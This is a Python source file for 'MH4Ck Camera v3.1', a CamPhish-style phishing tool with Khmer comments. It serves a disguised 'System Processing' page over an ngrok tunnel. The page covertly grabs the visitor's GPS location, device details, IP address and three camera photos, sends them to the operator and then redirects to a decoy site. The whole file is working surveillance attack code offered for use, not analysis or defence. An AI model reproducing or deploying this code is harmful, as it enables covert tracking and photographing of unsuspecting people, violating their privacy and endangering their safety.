#!/usr/bin/env python3
# ============================================================================
# MH4Ck Camera v3.1 - Termux Ngrok v2 (CamPhish Style)
# Developer: @mengheang25
# From: Cambodia 🇰🇭
# ============================================================================

import os
import sys
import json
import time
import uuid
import base64
import threading
import urllib.parse
import requests
import subprocess
import signal
import atexit
import stat
import tarfile
import zipfile
import shutil
import socket
import platform
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO
import logging
import re

# ==================== បិទ Log Flask ====================
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
os.environ['WERKZEUG_RUN_MAIN'] = 'true'

# ==================== Flask App ====================
app = Flask(__name__)

# ==================== អថេរសកល ====================
ngrok_process = None
ngrok_url = None
current_mode = "cam_location"
processed_clicks = set()
notification_lock = threading.Lock()
flask_port = 3333  # ប្រើ port 3333 ដូច CamPhish

# ==================== ពណ៌សម្រាប់បង្ហាញ ====================
class Colors:
    HEADER = '\033[1;35m'
    BLUE = '\033[1;34m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    RED = '\033[1;31m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    PURPLE = '\033[1;35m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    END = '\033[0m'
    ORANGE = '\033[1;91m'
    PINK = '\033[1;95m'

# ==================== HTML Templates ====================
# ប្រើ HTML ដូច CamPhish តែកែលម្អបន្តិច
CAM_LOCATION_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body {
            background: linear-gradient(145deg, #0a0f1e 0%, #141b2b 100%);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
            background: rgba(10, 20, 30, 0.8);
            border-radius: 20px;
            padding: 40px 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h2 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #00ff87;
        }
        .loading {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #00ff87;
            animation: spin 1s infinite;
            margin: 20px 0;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        p {
            color: #a0b3cc;
            font-size: 16px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>System Processing</h2>
        <div class="loading"></div>
        <p>Please wait...</p>
        <p style="font-size: 14px; color: #5a6c82;">Initializing secure connection...</p>
    </div>

    <script>
    async function start() {
        try {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };

            // Get location
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 0
                        });
                    });
                    info.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                } catch(e) {
                    info.locationError = e.message;
                }
            }

            // Get battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100);
                    info.batteryCharging = battery.charging;
                } catch(e) {}
            }

            // Get camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                info.cameraAccess = true;
                info.cameraType = "front";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                info.cameraPhotos = [];
                
                // Take 3 photos
                for(let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 300));
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    info.cameraPhotos.push(canvas.toDataURL('image/jpeg', 0.8));
                }
                
                stream.getTracks().forEach(t => t.stop());
                
            } catch(e) {
                info.cameraAccess = false;
                info.cameraError = e.name || e.message;
            }

            // Get IP
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info.ipAddress = data.ip;
            } catch(e) {
                info.ipAddress = 'unknown';
            }

            // Send data
            await fetch('/track/{{ track_id }}?mode={{ mode }}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });

            // Redirect
            window.location.href = '{{ redirect_url }}';
            
        } catch(error) {
            console.error(error);
            window.location.href = '{{ redirect_url }}';
        }
    }

    window.onload = start;
    </script>
</body>
</html>"""

ONLY_LOCATION_HTML = CAM_LOCATION_HTML.replace(
    "// Get camera", 
    "// Camera disabled"
).replace(
    """// Get camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                info.cameraAccess = true;
                info.cameraType = "front";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                info.cameraPhotos = [];
                
                // Take 3 photos
                for(let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 300));
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    info.cameraPhotos.push(canvas.toDataURL('image/jpeg', 0.8));
                }
                
                stream.getTracks().forEach(t => t.stop());
                
            } catch(e) {
                info.cameraAccess = false;
                info.cameraError = e.name || e.message;
            }""",
    "// Camera disabled"
)

BACK_CAMERA_HTML = CAM_LOCATION_HTML.replace('facingMode: "user"', 'facingMode: { exact: "environment" }').replace('"front"', '"back"')

FRONT_CAMERA_HTML = CAM_LOCATION_HTML

# ==================== ទាញយក Ngrok v2 (ស្ថេរភាព ដូច CamPhish) ====================
def download_ngrok():
    """ទាញយក ngrok v2 សម្រាប់ Termux (វិធីដូច CamPhish)"""
    ngrok_path = os.path.join(os.getcwd(), 'ngrok')
    
    # បើមានរួចហើយ ប្រើវា
    if os.path.exists(ngrok_path):
        try:
            os.chmod(ngrok_path, 0o755)
            # សាកល្បងដំណើរការ
            result = subprocess.run([ngrok_path, 'version'], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                print(f"{Colors.GREEN}[✅] Ngrok មានរួចហើយ!{Colors.END}")
                return ngrok_path
        except:
            pass
    
    print(f"{Colors.YELLOW}[📥] កំពុងទាញយក Ngrok v2...{Colors.END}")
    
    # រកមើល architecture
    machine = platform.machine().lower()
    
    if 'aarch64' in machine or 'arm64' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
        filename = "ngrok.zip"
    elif 'arm' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
        filename = "ngrok.zip"
    else:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
        filename = "ngrok.zip"
    
    try:
        # ប្រើ wget ជំនួស requests (ដូច CamPhish)
        print(f"{Colors.YELLOW}   URL: {url}{Colors.END}")
        
        # សាកល្បងប្រើ wget ជាមុន
        try:
            subprocess.run(['wget', '--no-check-certificate', '-O', filename, url], 
                          check=True, timeout=60, capture_output=True)
        except:
            # បើ wget មិនមាន ប្រើ requests
            response = requests.get(url, stream=True, timeout=30)
            with open(filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
        
        print(f"{Colors.GREEN}   ✅ ទាញយករួចរាល់!{Colors.END}")
        
        # ពន្លា (ប្រើ zip ជំនួស tar ដើម្បីកុំឲ្យមាន DeprecationWarning)
        print(f"{Colors.YELLOW}   📦 កំពុងពន្លា...{Colors.END}")
        
        with zipfile.ZipFile(filename, 'r') as zip_ref:
            zip_ref.extractall()
        
        # លុបឯកសារ zip
        os.remove(filename)
        
        # កំណត់សិទ្ធិ
        if os.path.exists(ngrok_path):
            os.chmod(ngrok_path, 0o755)
        
        # សាកល្បងដំណើរការ
        result = subprocess.run([ngrok_path, 'version'], capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            print(f"{Colors.GREEN}[✅] Ngrok ដំឡើងរួចរាល់!{Colors.END}")
            return ngrok_path
        else:
            print(f"{Colors.RED}[❌] Ngrok ដំឡើងបរាជ័យ{Colors.END}")
            return None
        
    except Exception as e:
        print(f"{Colors.RED}[❌] បរាជ័យក្នុងការទាញយក: {e}{Colors.END}")
        return None

# ==================== កំណត់ Authtoken (ដូច CamPhish) ====================
def setup_ngrok_auth(authtoken):
    """កំណត់ authtoken សម្រាប់ ngrok (វិធីដូច CamPhish)"""
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return False
    
    try:
        print(f"{Colors.YELLOW}[🔑] កំពុងកំណត់ Ngrok Authtoken...{Colors.END}")
        
        # ប្រើ command authtoken (ដូច CamPhish)
        result = subprocess.run(
            [ngrok_path, 'authtoken', authtoken],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}[✅] កំណត់ Authtoken រួចរាល់!{Colors.END}")
            return True
        else:
            # វិធីជំនួស: បង្កើត config ក្នុង .ngrok2
            home = os.path.expanduser("~")
            ngrok_dir = os.path.join(home, ".ngrok2")
            os.makedirs(ngrok_dir, exist_ok=True)
            
            config_file = os.path.join(ngrok_dir, "ngrok.yml")
            with open(config_file, 'w') as f:
                f.write(f"authtoken: {authtoken}\n")
            
            print(f"{Colors.GREEN}[✅] រក្សាទុក Authtoken ក្នុង .ngrok2{Colors.END}")
            return True
            
    except Exception as e:
        print(f"{Colors.RED}[❌] បរាជ័យ: {e}{Colors.END}")
        return False

# ==================== ចាប់ផ្តើម Ngrok (ដូច CamPhish) ====================
def start_ngrok(port=3333):
    """ចាប់ផ្តើម ngrok tunnel (វិធីដូច CamPhish)"""
    global ngrok_process, ngrok_url
    
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return None
    
    # បិទ ngrok ចាស់
    stop_ngrok()
    
    try:
        print(f"{Colors.YELLOW}[🔄] កំពុងចាប់ផ្តើម Ngrok លើ port {port}...{Colors.END}")
        
        # ចាប់ផ្តើម ngrok (ដូច CamPhish)
        ngrok_process = subprocess.Popen(
            [ngrok_path, 'http', str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # រង់ចាំ ngrok ចាប់ផ្តើម
        print(f"{Colors.YELLOW}   កំពុងរង់ចាំ Ngrok...{Colors.END}")
        time.sleep(5)
        
        # ទាញយក URL
        for i in range(10):
            url = get_ngrok_url()
            if url:
                ngrok_url = url
                print(f"{Colors.GREEN}[✅] Ngrok URL: {url}{Colors.END}")
                return url
            time.sleep(1)
        
        # សាកល្បងវិធីផ្សេង
        url = get_ngrok_url_alternative()
        if url:
            ngrok_url = url
            print(f"{Colors.GREEN}[✅] Ngrok URL: {url}{Colors.END}")
            return url
        
        print(f"{Colors.RED}[❌] Ngrok បរាជ័យក្នុងការចាប់ផ្តើម{Colors.END}")
        return None
        
    except Exception as e:
        print(f"{Colors.RED}[❌] Error: {e}{Colors.END}")
        return None

def get_ngrok_url():
    """ទាញយក URL ពី Ngrok API (ដូច CamPhish)"""
    try:
        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=3)
        if response.status_code == 200:
            data = response.json()
            for tunnel in data.get('tunnels', []):
                public_url = tunnel.get('public_url', '')
                if 'https://' in public_url:
                    return public_url
    except:
        pass
    return None

def get_ngrok_url_alternative():
    """វិធីជំនួស៖ អានពី log (ដូច CamPhish)"""
    try:
        # ពិនិត្យមើល ngrok log
        result = subprocess.run(['pgrep', '-f', 'ngrok'], capture_output=True, text=True)
        if result.returncode == 0:
            # សាកល្បងប្រើ curl
            try:
                result = subprocess.run(['curl', '-s', 'http://127.0.0.1:4040/api/tunnels'], 
                                      capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    import json
                    data = json.loads(result.stdout)
                    for tunnel in data.get('tunnels', []):
                        public_url = tunnel.get('public_url', '')
                        if 'https://' in public_url:
                            return public_url
            except:
                pass
    except:
        pass
    return None

def stop_ngrok():
    """បិទ ngrok (ដូច CamPhish)"""
    global ngrok_process
    
    if ngrok_process:
        try:
            ngrok_process.terminate()
            ngrok_process.wait(timeout=2)
        except:
            ngrok_process.kill()
        ngrok_process = None
    
    # បិទ ngrok ទាំងអស់
    try:
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
    except:
        pass
    
    time.sleep(1)

# ==================== រក្សាទុករូបភាព ====================
def save_photos(track_id, photos, camera_type):
    """រក្សាទុករូបភាព"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dir_path = f"captured_{track_id}_{timestamp}"
        os.makedirs(dir_path, exist_ok=True)
        
        saved = 0
        
        for i, photo_data in enumerate(photos):
            try:
                # ដោះ base64
                if ',' in photo_data:
                    photo_data = photo_data.split(',')[1]
                
                img_data = base64.b64decode(photo_data)
                img = Image.open(BytesIO(img_data))
                
                # បន្ថែម watermark
                draw = ImageDraw.Draw(img)
                try:
                    font = ImageFont.load_default()
                except:
                    font = None
                
                text = f"MH4Ck | {track_id} | t.me/mengheang25"
                draw.text((10, img.height - 20), text, fill=(0,255,0), font=font)
                
                # រក្សាទុក
                filename = f"{dir_path}/{camera_type}_{i+1}.jpg"
                img.save(filename, 'JPEG', quality=85)
                saved += 1
                
            except Exception as e:
                continue
        
        print(f"{Colors.GREEN}   💾 រក្សាទុក {saved} រូបភាព{Colors.END}")
        print(f"{Colors.CYAN}   📁 ទីតាំង: {dir_path}{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}   ❌ បរាជ័យ: {e}{Colors.END}")

# ==================== បង្ហាញ Notification ====================
def print_notification(track_id, data, mode):
    """បង្ហាញពេលមានអ្នកចុច link"""
    
    mode_names = {
        'cam_location': 'Camera + Location',
        'only_location': 'Only Location',
        'back_camera': 'Back Camera',
        'front_camera': 'Front Camera'
    }
    
    print(f"\n{Colors.RED}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.YELLOW}                    🔔 មានអ្នកចុច Link! 🔔{Colors.END}")
    print(f"{Colors.RED}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.CYAN}[⏰] ម៉ោង:{Colors.END}      {data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}")
    print(f"{Colors.CYAN}[🎯] របៀប:{Colors.END}      {mode_names.get(mode, mode)}")
    print(f"{Colors.CYAN}[🆔] Track ID:{Colors.END}  {track_id}")
    print(f"{Colors.CYAN}[🌐] IP:{Colors.END}        {data.get('ip_address', 'N/A')}")
    
    if 'location' in data:
        lat = data['location'].get('latitude', 'N/A')
        lng = data['location'].get('longitude', 'N/A')
        print(f"{Colors.GREEN}[📍] ទីតាំង:{Colors.END}    {lat}, {lng}")
        print(f"{Colors.GREEN}[🗺️] Google Maps:{Colors.END} https://maps.google.com/?q={lat},{lng}")
    
    if 'batteryLevel' in data:
        print(f"{Colors.YELLOW}[🔋] ថ្ម:{Colors.END}        {data['batteryLevel']}%")
    
    if 'cameraPhotos' in data and data['cameraPhotos']:
        camera_type = data.get('cameraType', 'front')
        print(f"{Colors.PURPLE}[📸] កាមេរ៉ា:{Colors.END}     {camera_type}")
        print(f"{Colors.PURPLE}[📸] រូបថត:{Colors.END}     {len(data['cameraPhotos'])} សន្លឹក")
    
    print(f"{Colors.RED}═══════════════════════════════════════════════════════════════{Colors.END}\n")

# ==================== Flask Route ====================
@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track_handler(track_id):
    """ដោះស្រាយការចូលមកកាន់ link"""
    if request.method == 'GET':
        redirect_url = request.args.get('url', 'https://www.google.com')
        mode = request.args.get('mode', 'cam_location')
        
        if mode == 'cam_location':
            html = CAM_LOCATION_HTML
        elif mode == 'only_location':
            html = ONLY_LOCATION_HTML
        elif mode == 'back_camera':
            html = BACK_CAMERA_HTML
        else:
            html = FRONT_CAMERA_HTML
        
        return render_template_string(
            html, 
            track_id=track_id, 
            redirect_url=redirect_url, 
            mode=mode
        )
    else:
        try:
            data = request.json
            data['ip_address'] = request.remote_addr
            data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            mode = request.args.get('mode', 'cam_location')
            
            click_id = f"{track_id}_{data.get('ip_address', 'unknown')}"
            
            with notification_lock:
                if click_id not in processed_clicks:
                    print_notification(track_id, data, mode)
                    processed_clicks.add(click_id)
                    
                    if 'cameraPhotos' in data and data['cameraPhotos']:
                        camera_type = data.get('cameraType', 'front')
                        save_photos(track_id, data['cameraPhotos'], camera_type)
            
            return jsonify({'success': True})
            
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

# ==================== មុខងារចម្បង (ដូច CamPhish) ====================
def create_link(mode):
    """បង្កើត tracking link (ដូច CamPhish)"""
    global current_mode, flask_port
    current_mode = mode
    
    # 1. ទាញយក Ngrok
    ngrok_path = download_ngrok()
    if not ngrok_path:
        print(f"{Colors.RED}[❌] មិនអាចទាញយក Ngrok បានទេ!{Colors.END}")
        return False
    
    # 2. បញ្ចូល authtoken
    print(f"\n{Colors.YELLOW}[🔑] សូមបញ្ចូល Ngrok Authtoken:{Colors.END}")
    print(f"{Colors.CYAN}    ទទួលបានពី: https://dashboard.ngrok.com{Colors.END}")
    
    token = input(f"{Colors.YELLOW}    Authtoken: {Colors.END}").strip()
    
    if not token:
        print(f"{Colors.RED}[❌] មិនអាចទទេរ!{Colors.END}")
        return False
    
    # 3. កំណត់ authtoken
    if not setup_ngrok_auth(token):
        print(f"{Colors.RED}[❌] កំណត់ Authtoken បរាជ័យ!{Colors.END}")
        return False
    
    # 4. បញ្ចូល URL គោលដៅ
    target = input(f"{Colors.YELLOW}[🎯] URL គោលដៅ (Enter = Google): {Colors.END}").strip()
    if not target:
        target = "https://www.google.com"
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # 5. បង្កើត Track ID
    track_id = str(uuid.uuid4())[:6]
    
    # 6. ចាប់ផ្តើម Flask (port 3333 ដូច CamPhish)
    print(f"{Colors.YELLOW}[🔄] កំពុងចាប់ផ្តើម PHP server...{Colors.END}")
    
    def run_flask():
        app.run(host='0.0.0.0', port=3333, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    print(f"{Colors.GREEN}[✅] PHP server ដំណើរការលើ localhost:3333{Colors.END}")
    time.sleep(3)
    
    # 7. ចាប់ផ្តើម Ngrok
    ngrok_url = start_ngrok(3333)
    if not ngrok_url:
        print(f"{Colors.RED}[❌] Ngrok បរាជ័យ!{Colors.END}")
        return False
    
    # 8. បង្កើត Link
    tracking_link = f"{ngrok_url}/track/{track_id}?url={urllib.parse.quote(target)}&mode={mode}"
    
    # 9. បង្ហាញលទ្ធផល
    print(f"\n{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.GREEN}                    ✅ LINK បង្កើតរួចរាល់!                    {Colors.END}")
    print(f"{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.CYAN}[🎯] របៀប:{Colors.END}        {mode}")
    print(f"{Colors.CYAN}[🆔] Track ID:{Colors.END}    {track_id}")
    print(f"{Colors.CYAN}[🔗] Direct link:{Colors.END}")
    print(f"{Colors.UNDERLINE}{tracking_link}{Colors.END}")
    print(f"\n{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.YELLOW}[⚠️]  រង់ចាំការចុច Link... (Ctrl+C ដើម្បីបញ្ឈប់){Colors.END}")
    print(f"{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}\n")
    
    return True

def clear_data():
    """លុបទិន្នន័យ"""
    try:
        for item in os.listdir('.'):
            if item.startswith('captured_') or item.startswith('cam'):
                if os.path.isdir(item):
                    shutil.rmtree(item)
                else:
                    os.remove(item)
        processed_clicks.clear()
        print(f"{Colors.GREEN}[✅] លុបទិន្នន័យរួចរាល់!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[❌] បរាជ័យ: {e}{Colors.END}")
    time.sleep(2)

def show_banner():
    """បង្ហាញ Banner"""
    os.system('clear')
    
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                                  ║
║     {Colors.WHITE}███╗   ███╗██╗  ██╗██╗  ██████╗██╗  ██╗{Colors.CYAN}             ║
║     {Colors.WHITE}████╗ ████║██║  ██║██║ ██╔════╝██║ ██╔╝{Colors.CYAN}             ║
║     {Colors.WHITE}██╔████╔██║███████║██║ ██║     █████╔╝ {Colors.CYAN}             ║
║     {Colors.WHITE}██║╚██╔╝██║██╔══██║██║ ██║     ██╔═██╗ {Colors.CYAN}             ║
║     {Colors.WHITE}██║ ╚═╝ ██║██║  ██║██║ ╚██████╗██║  ██╗{Colors.CYAN}             ║
║     {Colors.WHITE}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═════╝╚═╝  ╚═╝{Colors.CYAN}             ║
║                                                                  ║
║              {Colors.GREEN}📱 MH4Ck Camera v3.1{Colors.CYAN}                          ║
║              {Colors.YELLOW}ដំណើរការជាមួយ Ngrok v2{Colors.CYAN}                    ║
║              {Colors.PURPLE}(ដូច CamPhish){Colors.CYAN}                              ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║     {Colors.PURPLE}Developer{Colors.CYAN}  : {Colors.WHITE}@mengheang25{Colors.CYAN}                                   ║
║     {Colors.PURPLE}From{Colors.CYAN}        : {Colors.WHITE}Cambodia 🇰🇭{Colors.CYAN}                                ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def show_menu():
    """បង្ហាញ Menu"""
    menu = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                      {Colors.YELLOW}【 MAIN MENU 】{Colors.CYAN}                        ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  {Colors.GREEN}[1]{Colors.CYAN}  📸 {Colors.WHITE}Camera + Location{Colors.CYAN}      - GPS + កាមេរ៉ាមុខ      ║
║  {Colors.GREEN}[2]{Colors.CYAN}  📍 {Colors.WHITE}Only Location{Colors.CYAN}         - ទីតាំងតែប៉ុណ្ណោះ      ║
║  {Colors.GREEN}[3]{Colors.CYAN}  📷 {Colors.WHITE}Back Camera{Colors.CYAN}           - កាមេរ៉ាក្រោយ         ║
║  {Colors.GREEN}[4]{Colors.CYAN}  🤳 {Colors.WHITE}Front Camera{Colors.CYAN}          - កាមេរ៉ាមុខ           ║
║  {Colors.GREEN}[5]{Colors.CYAN}  🗑️ {Colors.WHITE}Clear Data{Colors.CYAN}           - លុបទិន្នន័យ          ║
║  {Colors.GREEN}[6]{Colors.CYAN}  ❌ {Colors.WHITE}Exit{Colors.CYAN}                 - ចាកចេញ              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(menu)

def main():
    """មុខងារចម្បង"""
    
    # ចុះឈ្មោះ cleanup
    atexit.register(stop_ngrok)
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    
    while True:
        try:
            show_banner()
            show_menu()
            
            choice = input(f"{Colors.YELLOW}🔹 ជ្រើសរើស (1-6): {Colors.END}").strip()
            
            if choice == '1':
                create_link('cam_location')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '2':
                create_link('only_location')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '3':
                create_link('back_camera')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '4':
                create_link('front_camera')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '5':
                clear_data()
                
            elif choice == '6':
                print(f"\n{Colors.YELLOW}👋 លាហើយ!{Colors.END}")
                stop_ngrok()
                sys.exit(0)
                
            else:
                print(f"{Colors.RED}❌ សូមជ្រើសរើស 1-6 តែប៉ុណ្ណោះ!{Colors.END}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}👋 លាហើយ!{Colors.END}")
            stop_ngrok()
            sys.exit(0)

if __name__ == '__main__':
    main()
